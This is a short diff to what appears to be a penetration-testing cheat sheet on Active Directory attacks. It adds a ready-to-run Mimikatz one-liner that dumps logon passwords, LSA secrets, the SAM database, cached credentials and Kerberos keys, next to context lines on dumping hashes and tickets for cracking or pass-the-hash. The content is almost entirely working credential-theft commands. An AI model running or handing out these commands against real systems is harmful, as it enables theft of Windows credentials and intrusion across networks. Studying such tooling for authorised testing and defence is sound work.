@@ -17,6 +17,11 @@ sekurlsa::logonpasswords # Dumping hashes for logged on users using sekurlsa mod
 # Crack the hashes now or Pass the Hash.
 
 sekurlsa::tickets # Dumping TGT/TGS Tickets stored in memory.
+
+
+Mimikatz One-Liner:
+
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "token::elevate" "lsadump::sam /system:C:\TEMP\SYSTEM /sam:C:\TEMP\SAM sam.hiv security.hiv system.hiv" "lsadump::cache" "sekurlsa::ekeys" "exit"
 ```
 
 ### Kerberoasting
